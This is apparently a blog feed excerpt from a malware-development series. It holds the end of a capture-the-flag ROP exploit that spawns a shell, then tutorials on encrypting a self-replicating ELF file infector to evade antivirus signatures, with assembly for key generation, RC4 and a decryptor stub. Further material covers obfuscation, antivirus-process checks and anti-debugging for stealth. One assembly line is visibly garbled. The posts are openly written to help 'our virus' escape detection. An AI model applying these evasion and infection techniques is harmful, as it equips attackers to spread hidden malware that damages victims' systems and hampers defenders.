&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;print(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;libc:&amp;#39;&lt;/span&gt;, hex(libc&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;address))
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;rop &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; ROP(libc)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;bin_sh &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; next(libc&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;search(&lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;/bin/sh&amp;#39;&lt;/span&gt;))
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;pop_rdi &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; rop&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;rdi&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;address
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;system &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; libc&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;symbols&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;system
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;ret &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x401184&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;rop&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;raw(pop_rdi)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;rop&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;raw(bin_sh)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;rop&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;raw(ret)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;rop&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;raw(system)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;spell &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; magic_mark &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; padding &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; rop&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;chain()
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;payload &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; gen_payload(spell)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;send_payload(io, payload)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;io&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;interactive()
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Just launch it and enjoy the flag !&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://alagroy-42.github.io/sacred_scrolls_getflag.png&#34; alt=&#34;getflag&#34;&gt;&lt;/p&gt;
</content>
    </item>
    
    <item>
      <title>Oligomorphism: How to encrypt our virus and evade signature-based detection</title>
      <link>https://alagroy-42.github.io/malware_dev/oligomorphism/</link>
      <pubDate>Fri, 23 Sep 2022 16:02:14 +0200</pubDate>
      
      <guid>https://alagroy-42.github.io/malware_dev/oligomorphism/</guid>
      <description>Introduction Until not so long ago, antiviruses were mostly relying on signatures to detect malware. What it means is that, whenever a file written to disk, downloaded or launched, the antivirus software checks if it is a known malware. To do so, it is doing two things. The first one is hashing the sample and check if that specific sample is present in the known malware database. But some type of malware are &amp;ldquo;naturally immune&amp;rdquo; to this kind of analysis.</description>
      <content>&lt;h2 id=&#34;introduction&#34;&gt;Introduction&lt;/h2&gt;
&lt;p&gt;Until not so long ago, antiviruses were mostly relying on signatures to detect malware. What it means is that, whenever a file written to disk, downloaded or launched, the antivirus software checks if it is a known malware. To do so, it is doing two things. The first one is hashing the sample and check if that specific sample is present in the known malware database. But some type of malware are &amp;ldquo;naturally immune&amp;rdquo; to this kind of analysis. For example, our file infector, except for its first instance that will stay the same all the time, will never get the same hash since it will propagate in different files and that hash analysis is not able to spot infected files. That is why antivirus rely on a second type analysis known as signature-based detection. Once a sample has been found and analyzed, analysts create a signature for this malware, which is a set of rules to identify it. These rules can be plenty of things but are mostly strings present in memory or specific code sequences. With that kind of analysis, once the rules have been written for our infector, the antivirus software will be able to detect our first virus instance but also each infected binaries since they will all contain these specific signatures. That is where oligomorphism comes in.
Even though nowadays, security software are much more complex and use a wide variety of detection techniques, they still use signature-based analysis and you should always encrypt any piece of code that you put out there in the will or you will not be able to reuse it once it has been found and that a signature exists for it.&lt;/p&gt;
&lt;h2 id=&#34;what-is-oligomorphism-&#34;&gt;What is oligomorphism ?&lt;/h2&gt;
&lt;p&gt;Once faced with the problem of antivirus and signature-based detection, virus developers had to adapt. It wasn&amp;rsquo;t possible anymore to put the same self-replicating piece of code in thousands of files on a system without getting detected. That&amp;rsquo;s when a technical race started (and is still continuing now) between malicious software writers and security vendors and that race started with oligomorphism. This word comes from two greek roots: &lt;code&gt;Oligo&lt;/code&gt; which means &amp;ldquo;not much&amp;rdquo; and &lt;code&gt;morph&lt;/code&gt; which means shape. Oligomorphism is a software that will change its shape but now much. Indeed, the executed code and the internal structure of the virus will always remain the same, the only thing that will change is the way it is written to disk. Since at first, antiviruses were only analyzing the file being written or executed, the point was to write an encrypted version of the virus that will change at each replication so that it is not possible to develop a &amp;ldquo;universal&amp;rdquo; signature that will match all the replication of the program.&lt;/p&gt;
&lt;h2 id=&#34;how-does-it-works-&#34;&gt;How does it works ?&lt;/h2&gt;
&lt;p&gt;The principle itself is very simple, each occurrence of our self-replicating program has to be different. To do so, we will encrypt the virus using a key algorithm and we will change the key at each occurrence so that the result is different all the time. Once we&amp;rsquo;ve done that, we will bypass the signature-based detection but we still have a (big) problem: our encrypted code is not executable anymore. To remedy that, we will have to add a decryptor, that we won&amp;rsquo;t encrypt so that it stays executable. By doing so, the executed code will be completely different than the one present in the file which is why it will bypass the antivirus and still keep its integrity because the executed code will remain the same at each occurrence.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://alagroy-42.github.io/oligo_base.png&#34; alt=&#34;oligo&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;lets-code-now&#34;&gt;Let&amp;rsquo;s code now&lt;/h2&gt;
&lt;p&gt;I will only put code chunks concerning encryption in this article, if you want to check a fully-working oligomorphic virus, &lt;a href=&#34;https://github.com/alagroy-42/Pestilence&#34;&gt;here&lt;/a&gt; is the link to one of mine.&lt;/p&gt;
&lt;p&gt;First we have to choose an algorithm to encrypt our virus. It is usually a good solution to work with XOR-based algorithms. The advantage of XOR is that it is reversible and it will break code patterns and have a better entropy than ROT-based algorithms. I&amp;rsquo;ve chosen to use the RC4 algorithm that generates a pseudo random bytes stream and it has the advantage that we can use the same algorithm to encrypt and decrypt our function.&lt;/p&gt;
&lt;p&gt;To proceed, we first want to generate a random key. To do so, we will use the &lt;code&gt;/dev/urandom&lt;/code&gt; file that is a continuous random byte stream. I&amp;rsquo;ve chosen to use a 32 bytes key but it can work with any number even though it is better to choose a power of two.&lt;/p&gt;



  &lt;div class=&#34;collapsable-code&#34;&gt;
    &lt;input id=&#34;key_gen&#34; type=&#34;checkbox&#34;  /&gt;
    &lt;label for=&#34;key_gen&#34;&gt;
      &lt;span class=&#34;collapsable-code__language&#34;&gt;nasm&lt;/span&gt;
      &lt;span class=&#34;collapsable-code__title&#34;&gt;key_gen.s&lt;/span&gt;
      &lt;span class=&#34;collapsable-code__toggle&#34; data-label-expand=&#34;Show&#34; data-label-collapse=&#34;Hide&#34;&gt;&lt;/span&gt;
    &lt;/label&gt;
    &lt;pre class=&#34;language-nasm&#34; &gt;&lt;code&gt;

generate_key:
    push    rbp
    mov     rbp, rsp
    push    rdi
    lea     rdi, [rel key_file]     ; /dev/urandom
    xor     rsi, rsi ; O_RDONLY
    mov     eax, SYS_OPEN
    syscall
    cmp     eax, 0
    jl      _end                    ; in case we cannot get a key and therefore encrypt our virus
    push    rax
    mov     rdi, rax
    lea     rsi, [rel key]          ; where our key will be stored
    mov     rdx, key_len
    mov     eax, SYS_READ
    syscall
    pop     rdi
    mov     eax, SYS_CLOSE
    syscall
    leave
    ret

&lt;/code&gt;&lt;/pre&gt;
  &lt;/div&gt;


&lt;p&gt;Then we will code the RC4 routine (if you want to more about the algorithm, you can visit &lt;a href=&#34;https://en.wikipedia.org/wiki/RC4&#34;&gt;its Wikipedia page&lt;/a&gt;). It is simply the reimplementation of the Wikipedia pseudo-code in ASM.&lt;/p&gt;



  &lt;div class=&#34;collapsable-code&#34;&gt;
    &lt;input id=&#34;rc4&#34; type=&#34;checkbox&#34;  /&gt;
    &lt;label for=&#34;rc4&#34;&gt;
      &lt;span class=&#34;collapsable-code__language&#34;&gt;nasm&lt;/span&gt;
      &lt;span class=&#34;collapsable-code__title&#34;&gt;rc4.s&lt;/span&gt;
      &lt;span class=&#34;collapsable-code__toggle&#34; data-label-expand=&#34;Show&#34; data-label-collapse=&#34;Hide&#34;&gt;&lt;/span&gt;
    &lt;/label&gt;
    &lt;pre class=&#34;language-nasm&#34; &gt;&lt;code&gt;

; rdi       crypt_pointer
; rsi       crypt_len
rc4:
    push    rbp
    mov     rbp, rsp
    sub     rsp, 0x120          ; we reserve space on the stack for the vector
    sub     rsp, rsi
    mov     [rsp], rdi
    mov     [rsp &amp;#43; 0x8], rsi
    mov     rcx, 0x100
    xor     al, al
    lea     rdi, [rsp &amp;#43; 0x10]
loop_init_vector:
    stosb
    inc al
    loop    loop_init_vector    ; we have a [0...255] vector

    xor     r8, r8
    xor     r9, r9
    lea     rdi, [rel key]
    lea     rsi, [rsp &amp;#43; 0x10]
    mov     cx, 0x100
rc4_init_loop:                          ; we now modify the vector with the random bytes of the key
    mov     rax, r8                     ; the advantage of a power of 2 key is that we can use the AND operator
    and     rax, 0x1f                   ; instead of DIV and MOD 
    add     rax, rdi
    movzx   rdx, BYTE [rax]
    mov     rbx, r8
    add     rbx, rsi
    movzx   r10, BYTE [rbx]
    add     r9, r10
    add     r9, rdx
    movzx   r9, r9b
    mov     rax, r9
    add     rax, rsi
    mov     dl, BYTE [rax]
    mov     BYTE [rax], r10b
    mov     BYTE [rbx], dl
    inc     r8
    loop    rc4_init_loop

rc4_crypt:                      ; then we encrypt our payload with the generated vector
    mov     rcx, [rsp &amp;#43; 0x8]
    lea     rdi, [rsp &amp;#43; 0x110]
    mov     rsi, [rsp]
    lea     r10, [rsp &amp;#43; 0x10]
    xor     r8, r8
    xor     r9, r9

rc4_crypt_loop:
    inc     r8
    movzx   r8, r8b
    mov     r11, r10
    add     r11, r8
    add     r9b, [r11]
    movzx   r9, r9b
    mov     r12, r10
    add     r12, ]
    mov     dl, [r12]
    mov     bl, [r11]
    mov     [r12], bl
    mov     [r11], dl
    mov     dl, [r11]
    add     dl, [r12]
    movzx   rdx, dl
    add     rdx, r10
    mov     al, [rdx]
    xor     al, BYTE [rsi]
    mov     BYTE [rdi], al
    inc     rdi
    inc     rsi
    loop    rc4_crypt_loop

    mov     rdi, [rsp]
    lea     rsi, [rsp &amp;#43; 0x110]
    mov     rcx, [rsp &amp;#43; 0x8]
copy_crypted_mem:                   ; and we copy the encrypted payload in the memory
    lodsb
    stosb
    loop    copy_crypted_mem

    leave
    ret

&lt;/code&gt;&lt;/pre&gt;
  &lt;/div&gt;


&lt;p&gt;Now that we have the algorithm that is gonna encrypt and decrypt our payload, we can use it before copying our payload so that we copy an encrypted version. The last thing that we need to handle is decryption. You should be familiar with the code bouncing technique described in &lt;a href=&#34;https://alagroy-42.github.io/malware_dev/infector_advanced&#34;&gt;this article&lt;/a&gt;. Since we now have to decrypt the payload, it will be simpler to put it always at the same place and therefore use this technique so that we are nopt limited by the space available in the binary.&lt;/p&gt;
&lt;p&gt;Here is the code of the new payload that will be put in the &lt;code&gt;.text&lt;/code&gt; and that will call the decryptor before jumping on the decrypted code. Of course, the decryptor has to not be encrypted. I put it after the &lt;code&gt;.text&lt;/code&gt; but it would also be great to put it just before the viral code though we would need to calculate the offset of the decryptor to be able to call it.&lt;/p&gt;



  &lt;div class=&#34;collapsable-code&#34;&gt;
    &lt;input id=&#34;bouncer&#34; type=&#34;checkbox&#34;  /&gt;
    &lt;label for=&#34;bouncer&#34;&gt;
      &lt;span class=&#34;collapsable-code__language&#34;&gt;nasm&lt;/span&gt;
      &lt;span class=&#34;collapsable-code__title&#34;&gt;bouncer.s&lt;/span&gt;
      &lt;span class=&#34;collapsable-code__toggle&#34; data-label-expand=&#34;Show&#34; data-label-collapse=&#34;Hide&#34;&gt;&lt;/span&gt;
    &lt;/label&gt;
    &lt;pre class=&#34;language-nasm&#34; &gt;&lt;code&gt;

payload_mprotect:
    push    rbx
    push    r12
    lea     rdi, [rel payload_mprotect]
    add     rdi, [rel data_addr_offset]
    mov     rsi, [rel data_len]
    mov     rdx, PROT_READ | PROT_WRITE | PROT_EXEC
    xor     rax, rax
    add     rax, SYS_MPROTECT                       ; gives execution rights to the payload
    syscall
    lea     rdi, [rel payload_mprotect]
    add     rdi, [rel data_addr_offset]
    add     rdi, [rel data_len]
    sub     rdi, virus_len
    mov     rsi, virus_len
    push    rdi
    call    rc4                                     ; decrypts the payload
    pop     rax
    call    rax                                     ; jumps on the viral code
    pop     r12
    pop     rbx
    final_jump_opcode: db 0xe9                      ; jumps back to the original entrypoint
    final_jump: dd _end - $ - 4
    final_jump_offset equ final_jump - _start
    final_jump_offset_text equ final_jump - payload_mprotect

&lt;/code&gt;&lt;/pre&gt;
  &lt;/div&gt;


&lt;h2 id=&#34;conclusion&#34;&gt;Conclusion&lt;/h2&gt;
&lt;p&gt;Now, you&amp;rsquo;ve seen the basis of oligomorphism and how to make your virus oligomorphic. Even though it helps a great deal to counter signature-based detection, there is still one part of the code that stays constant, it is the decryptor and there could be a signature developed for it.&lt;/p&gt;
&lt;p&gt;To counter this, the next step in our malware developer journey is polymorphism and metamorphism and that is where the real fun comes in! The point of polymorphism is that not all generation of our virus use the same decryptor so that there cannot be a unique signature produced. Once security vendors understood that files were not gonna contain signatures anymore, they decided to sandbox the software before executing them for real. It means that it will be executed in a controlled-environment and then the process memory will be analyzed. Once decrypted, our payload is constant and looking for its signature inside the memory would prove successful so to avoid that, we can write metamorphic code. It means self-modifying code, each time our infector will replicate, it will provide a totally different payload though it will still achieve the same function. I&amp;rsquo;m still working on my metamorphic engine and will come back for another article once it is ready.&lt;/p&gt;
</content>
    </item>
    
    <item>
      <title>Obfuscation: The Art of pissing off reverse-engineers</title>
      <link>https://alagroy-42.github.io/malware_dev/obfuscation_techniques/</link>
      <pubDate>Wed, 13 Jul 2022 12:15:19 +0200</pubDate>
      
      <guid>https://alagroy-42.github.io/malware_dev/obfuscation_techniques/</guid>
      <description>Introduction To keep things simple, in cybersecurity operations, there are two teams : the blue team and the red team, the defenders and the attackers. Even though they seem completely different, each one&amp;rsquo;s goal is to make the other team&amp;rsquo;s job as hard as possible and eventually to defeat it. To do that, blue-teamers often use reverse-engineering to get a grasp on how malware works and how to mitigate its effect.</description>
      <content>&lt;h2 id=&#34;introduction&#34;&gt;Introduction&lt;/h2&gt;
&lt;p&gt;To keep things simple, in cybersecurity operations, there are two teams : the blue team and the red team, the defenders and the attackers. Even though they seem completely different, each one&amp;rsquo;s goal is to make the other team&amp;rsquo;s job as hard as possible and eventually to defeat it. To do that, blue-teamers often use reverse-engineering to get a grasp on how malware works and how to mitigate its effect. Here, we will see how we can try to make their job harder if they want to analyze our virus. There is usually two stages in the malware analysis : the static analysis and the dynamic one. The static consists in deassembling/decompiling the code to try to understand it though sometimes you cannot really understand a malware internal function just by reading it so you have to dynamically analyze it using debuggers to trace the execution and analyze ot step by step.&lt;/p&gt;
&lt;h2 id=&#34;countering-static-analysis&#34;&gt;Countering static analysis&lt;/h2&gt;
&lt;h3 id=&#34;preliminary-analysis&#34;&gt;Preliminary analysis&lt;/h3&gt;
&lt;p&gt;The fist step of static analysis will obviously be to list symbol names, variables or anything relevant in the code. For usual malware, it is recommended to strip the binary and to alter the functions/variables names to avoid it being useful in any way. There are a lot of automated software for that. In our case, let&amp;rsquo;s assume that it is the code of an infected binary that has been recovered. There won&amp;rsquo;t be any symbol names related to the viral code so that won&amp;rsquo;t be a problem. There is still one thing that is critical for analysis : raw strings. By using the &lt;code&gt;strings&lt;/code&gt; command, you can list all the alphanumerical strings present in the binary. Even though our code usually won&amp;rsquo;t rely on strings too much, we will still use some of them that would be very useful to analysts like the infection folders or &lt;code&gt;/bin/sh&lt;/code&gt; for the backdoor. To avoid having those raw strings in the code a good thing would be to store an encrypted value that would be decrypted at runtime, preferably not only alphanumerical so it doesn&amp;rsquo;t appear in the string list (avoid base 64, ROT or this kind of algorithm, XOR-based ones are usually a better solution).&lt;/p&gt;
&lt;h3 id=&#34;code-analysis&#34;&gt;Code analysis&lt;/h3&gt;
&lt;p&gt;Once the preliminary checks are done, it is usually time to analyze the code. In our case, let&amp;rsquo;s assume that the analyst found where the malicious code is, it will disassemble it to try to understand it. To deceive them, we will use several obfuscation to fool automated tools or even their comprehension of the code. Let&amp;rsquo;s review some of these.&lt;/p&gt;
&lt;p&gt;Here is a code sample that we are gonna alter and see the differences &lt;code&gt;objdump&lt;/code&gt; is gonna show us and how it can help us to deceive analysts.&lt;/p&gt;



  &lt;div class=&#34;collapsable-code&#34;&gt;
    &lt;input id=&#34;sample&#34; type=&#34;checkbox&#34;  /&gt;
    &lt;label for=&#34;sample&#34;&gt;
      &lt;span class=&#34;collapsable-code__language&#34;&gt;nasm&lt;/span&gt;
      &lt;span class=&#34;collapsable-code__title&#34;&gt;sample.s&lt;/span&gt;
      &lt;span class=&#34;collapsable-code__toggle&#34; data-label-expand=&#34;Show&#34; data-label-collapse=&#34;Hide&#34;&gt;&lt;/span&gt;
    &lt;/label&gt;
    &lt;pre class=&#34;language-nasm&#34; &gt;&lt;code&gt;
BITS 64

section .text

_start:
    push    rbp
    mov     rbp, rsp
    xor     rax, rax
    add     rax, 0xff
    push    rax
    mov     rdx, rax
    sub     rax, rdx
    leave
    ret
&lt;/code&gt;&lt;/pre&gt;
  &lt;/div&gt;


&lt;p&gt;Once compiled it gives us the following output when we disassemble it with &lt;code&gt;objdump&lt;/code&gt;:
&lt;img src=&#34;https://alagroy-42.github.io/obf_sample.png&#34; alt=&#34;obf_sample&#34;&gt;&lt;/p&gt;
&lt;p&gt;Let&amp;rsquo;s see how we are gonna alter this output and try to hide what the code is doing without altering its function with a few techniques.&lt;/p&gt;
&lt;h4 id=&#34;dead-code&#34;&gt;Dead code&lt;/h4&gt;
&lt;p&gt;The first and very easy way to obfuscate code is to add dead code inside that will show up but never be executed. It is very easy to do but also to undo. The principle is to add an unconditional jump to skip all the useless code. Obviously since it is very easy to do, it is also very easy to undo as an analysts. Since the jump is unconditional, the execution flow is very easy to follow so dead code will be very easy to detect. One of the other downside of this technique is that putting useless code takes place so when the payload size matters, it is not a very good idea to use it.&lt;/p&gt;



  &lt;div class=&#34;collapsable-code&#34;&gt;
    &lt;input id=&#34;dead_code&#34; type=&#34;checkbox&#34;  /&gt;
    &lt;label for=&#34;dead_code&#34;&gt;
      &lt;span class=&#34;collapsable-code__language&#34;&gt;nasm&lt;/span&gt;
      &lt;span class=&#34;collapsable-code__title&#34;&gt;dead_code.s&lt;/span&gt;
      &lt;span class=&#34;collapsable-code__toggle&#34; data-label-expand=&#34;Show&#34; data-label-collapse=&#34;Hide&#34;&gt;&lt;/span&gt;
    &lt;/label&gt;
    &lt;pre class=&#34;language-nasm&#34; &gt;&lt;code&gt;
BITS 64

section .text

_start:
    push    rbp
    mov     rbp, rsp
    xor     rax, rax
    jmp     end_of_dead_code ; All the code that follows before the label will never get executed
    push    rax
    pop     rbx
    mov     rcx, rax
    call    end_of_dead_code
    ret
    jmp     _start
end_of_dead_code:
    add     rax, 0xff
    push    rax
    mov     rdx, rax
    sub     rax, rdx
    leave
    ret
&lt;/code&gt;&lt;/pre&gt;
  &lt;/div&gt;


&lt;p&gt;Now &lt;code&gt;objdump&lt;/code&gt; is gonna show us all those useless instructions that are gonna add some noise to the analysis :&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://alagroy-42.github.io/obf_dead_code.png&#34; alt=&#34;obf_dead_code&#34;&gt;&lt;/p&gt;
&lt;h4 id=&#34;fake-jumps&#34;&gt;Fake jumps&lt;/h4&gt;
&lt;p&gt;Let&amp;rsquo;s get to real things now, the &amp;ldquo;fake jump&amp;rdquo; technique is one that I quite like and it is very simple to use. Its principle is very simple, it will jump on the next &amp;ldquo;real&amp;rdquo; instruction that we want to execute, and we put one or two dead bytes between the jump and the instruction. By carefully controlling these dead byte values to opcodes, we will make some tools like &lt;code&gt;objdump&lt;/code&gt; or the &lt;code&gt;gdb&lt;/code&gt; disassembler that those dead bytes are the beginning of an instruction which is gonna alter their interpretations of the next few instructions to totally different ones though the execution will remain the same.&lt;/p&gt;



  &lt;div class=&#34;collapsable-code&#34;&gt;
    &lt;input id=&#34;sample&#34; type=&#34;checkbox&#34;  /&gt;
    &lt;label for=&#34;sample&#34;&gt;
      &lt;span class=&#34;collapsable-code__language&#34;&gt;nasm&lt;/span&gt;
      &lt;span class=&#34;collapsable-code__title&#34;&gt;sample.s&lt;/span&gt;
      &lt;span class=&#34;collapsable-code__toggle&#34; data-label-expand=&#34;Show&#34; data-label-collapse=&#34;Hide&#34;&gt;&lt;/span&gt;
    &lt;/label&gt;
    &lt;pre class=&#34;language-nasm&#34; &gt;&lt;code&gt;
BITS 64

section .text

_start:
    push    rbp
    mov     rbp, rsp
    jmp $&amp;#43;4
    db 0x48, 0x8d ; Here we use REX.W LEA
    xor     rax, rax
    add     rax, 0xff
    push    rax
    mov     rdx, rax
    sub     rax, rdx
    leave
    ret
&lt;/code&gt;&lt;/pre&gt;
  &lt;/div&gt;


&lt;p&gt;And here is what we get once we disassemble this sample with &lt;code&gt;objdump&lt;/code&gt; :&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://alagroy-42.github.io/obf_fake_jump.png&#34; alt=&#34;obf_fake_jump&#34;&gt;&lt;/p&gt;
&lt;p&gt;We can see that it changed the way our code was disassembled although it won&amp;rsquo;t change anything about its execution. Placing a lot of those in your code will completely affect the output of this kind of tool like &lt;code&gt;objudmp&lt;/code&gt; or &lt;code&gt;gdb&lt;/code&gt;. However, this technique won&amp;rsquo;t work with modern disassembler like IDA which will disassemble the destination of the jump, which is our instructions.&lt;/p&gt;
&lt;h4 id=&#34;fake-ret&#34;&gt;Fake ret&lt;/h4&gt;
&lt;p&gt;Another interesting technique to use to counter static code analysis is the fake return technique. First, let&amp;rsquo;s talk about what the &lt;code&gt;call/ret&lt;/code&gt; instructions really do. &lt;code&gt;call&lt;/code&gt; is like a jump at the difference that it will push the &lt;code&gt;rip&lt;/code&gt; value on the stack before jumping so that when &lt;code&gt;ret&lt;/code&gt; is called it will pop that value and jump on it to get back to where we were. It means that if we manage to push the address of the next &amp;ldquo;real&amp;rdquo; instruction on the stack and then use &lt;code&gt;ret&lt;/code&gt;, it won&amp;rsquo;t do anything but most of the disassemblers/decompilers still nowadays are gonna stop decompiling the procedure as soon as it reaches the &lt;code&gt;ret&lt;/code&gt; instruction. I will use a macro here for clarity.&lt;/p&gt;



  &lt;div class=&#34;collapsable-code&#34;&gt;
    &lt;input id=&#34;fake_ret&#34; type=&#34;checkbox&#34;  /&gt;
    &lt;label for=&#34;fake_ret&#34;&gt;
      &lt;span class=&#34;collapsable-code__language&#34;&gt;nasm&lt;/span&gt;
      &lt;span class=&#34;collapsable-code__title&#34;&gt;fake_ret.s&lt;/span&gt;
      &lt;span class=&#34;collapsable-code__toggle&#34; data-label-expand=&#34;Show&#34; data-label-collapse=&#34;Hide&#34;&gt;&lt;/span&gt;
    &lt;/label&gt;
    &lt;pre class=&#34;language-nasm&#34; &gt;&lt;code&gt;
BITS 64

%macro PUSH_RET 0
    push    rax
    push    rax
    lea     rax, [rel %%ret_to]
    mov     QWORD [rsp &amp;#43; 0x8], rax
    pop     rax
    ret
    %%ret_to:
%endmacro

section .text
    global _start

_start:
    push    rbp
    mov     rbp, rsp
    PUSH_RET
    xor     rax, rax
    add     rax, 0xff
    push    rax
    mov     rdx, rax
    sub     rax, rdx
    leave
    ret
&lt;/code&gt;&lt;/pre&gt;
  &lt;/div&gt;


&lt;p&gt;&lt;img src=&#34;https://alagroy-42.github.io/obf_fake_ret.png&#34; alt=&#34;obf_fake_ret&#34;&gt;&lt;/p&gt;
&lt;p&gt;As you can see here, although the code that will be executed is basically the same, the disassembler shows it as being two different procedures, including one that will never be called (supposedly of course).&lt;/p&gt;
&lt;h2 id=&#34;countering-dynamic-analysis&#34;&gt;Countering dynamic analysis&lt;/h2&gt;
&lt;h3 id=&#34;anti-av-ultra-basic&#34;&gt;Anti-AV (ultra-basic)&lt;/h3&gt;
&lt;p&gt;Let&amp;rsquo;s consider that the infected system might have an AV/EDR running and that we know that some of them will catch us. We can have a &amp;ldquo;blacklist&amp;rdquo; that contains program name that will stop the execution of our program if running. To do that, we can check, for every numeric folder in the &lt;code&gt;/proc&lt;/code&gt; directory (which are fds), their &lt;code&gt;status&lt;/code&gt; file inside which there is a field that contains the name of the executable. By doing that, we can check every program running and see if we are safe to proceed with malicious activity.&lt;/p&gt;
&lt;h3 id=&#34;anti-debugger&#34;&gt;Anti-debugger&lt;/h3&gt;
&lt;p&gt;To be fair, anti-debugging is quite hard in the sense that a debugger can alter our program at runtime and by doing so, it can change return or register values and defeat our anti-debugging. Though, it is still useful to try to avoid tampering for two reasons, an automated program tracing our execution would not be able to find out about the anti-tampering routine. The other reason is that even though a human manually tracing the execution would be able to patch the anti-tampering checks, it would still induce a more or less significant loss of time depending on the technique used. The technique that is the most common is to use the &lt;code&gt;ptrace&lt;/code&gt; syscall in various way to check that. The first way os to try to attach to the parent process. In case it fails, it means that it is already tracing us which would imply that the parent process is probably a debugger. Since a process can be traced by only one process, another way to do so is to fork and then trace the child while the child will trace the parent. By doing so, we can check if one of them is already being traced (our own tracing would fail) but if we manage to &amp;ldquo;double trace&amp;rdquo; ourself, no process would be able to attach after the check since we already did. Even though those &lt;code&gt;ptrace&lt;/code&gt; techniques are great and useful, in the case of file infector, they can alter the way our host program works (it breaks &lt;code&gt;bash&lt;/code&gt; for example), which is something we absolutely don&amp;rsquo;t want for stealth reasons. To avoid that, the technique I used for my viruses is to check the &lt;code&gt;/proc/self/status&lt;/code&gt; file. This file contains plenty of information about the current process (ourself) including a &lt;code&gt;TracerPid&lt;/code&gt; field. If it is not null, we are being debugged.&lt;/p&gt;
&lt;h2 id=&#34;conclusion&#34;&gt;Conclusion&lt;/h2&gt;
&lt;p&gt;This is a little introduction to code obfuscation and anti-tampering. Even though most of these techniques are not applicable in the world of today, it is still a good way to learn the notions and the interest of this kind of techniques. For more advanced obfuscation stuff, I advise you tyo read my next post on &lt;a href=&#34;https://alagroy-42.github.io/malware_dev/oligomorphism&#34;&gt;oligomorphism&lt;/a&gt;.&lt;/p&gt;
</content>
    </item>
    
    <item>
      <title>The payload: How to setup a simple backdoor on a computer</title>
      <link>https://alagroy-42.github.io/malware_dev/simple_backdoor/</link>
      <pubDate>Fri, 08 Jul 2022 17:25:14 +0200</pubDate>
      
      <guid>https://alagroy-42.github.io/malware_dev/simple_backdoor/</guid>
      <description>Introduction Now that we have made a stealthy infector that is able to infect any ELF binary present on our system, we now have to make it useful. Being able to propagate is a good thing but we want to make something out of it. A backdoor allowing remote access on the infected machine would be a great idea. How do we do that ? This actually quite simple. Here we won&amp;rsquo;t really take care about stealthiness but I might write an article about it at some point.</description>
      <content>&lt;h2 id=&#34;introduction&#34;&gt;Introduction&lt;/h2&gt;
